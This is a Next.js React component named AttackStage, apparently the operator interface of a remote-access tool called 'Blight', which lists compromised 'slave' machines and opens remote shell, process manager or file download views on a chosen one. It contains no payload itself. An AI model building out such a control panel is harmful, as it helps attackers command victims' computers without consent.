"use client"; // ✅ Must be a client component to use useSearchParams

import { useSearchParams } from "next/navigation";
import { useEffect, useState } from "react";
import Link from "next/link";
import DownloadManager from "./DownloadManager";
import ProcessManager from "./ProcessManager";
import ShellCon from "./ShellCon";

interface SlaveData {
  freq: number;
  slaveIP: string;
  slaveLastCheckin: string;
  slaveName: string;
  slavePing: string;
  slaveStatus: string;
}

export default function AttackStage() {
  const searchParams = useSearchParams();
  const slaveName = searchParams.get("slaveName"); 
  const attack = searchParams.get("attack");
  const [slave, setSlave] = useState<SlaveData | null>(null);

  useEffect(() => {
    const fetchSlaveData = async () => {
      try {
        const response = await fetch(`/api/fetch-slaves`); 
        const jsonData = await response.json();

        if (jsonData.slaves) {
          const selectedSlave = jsonData.slaves.find((s: SlaveData) => s.slaveName === slaveName);
          setSlave(selectedSlave);
        }
      } catch (error) {
        console.error("Error fetching slave data:", error);
      }
    };

    if (slaveName) fetchSlaveData();
  }, [slaveName]);

  return (
    <div className="container mx-auto">
      <div className="w-full mx-auto ">
        <Link href="/blight">Back to Blight</Link>
        <h3 className="text-2xl font-bold">{slave?.slaveName || "Loading..."}</h3>
        {slave ? (
              <div>
                {attack === "process_manager" ? (
                  <ProcessManager slave={slave} />
                ) : attack === "shell" ? (
                  <ShellCon slave={slave} />
                ) : (
                  <DownloadManager slave={slave} />
                )}
              </div>
        ) : (
          <p className="text-gray-400">Loading slave data...</p>
        )}
      </div>
    </div>
  );
}
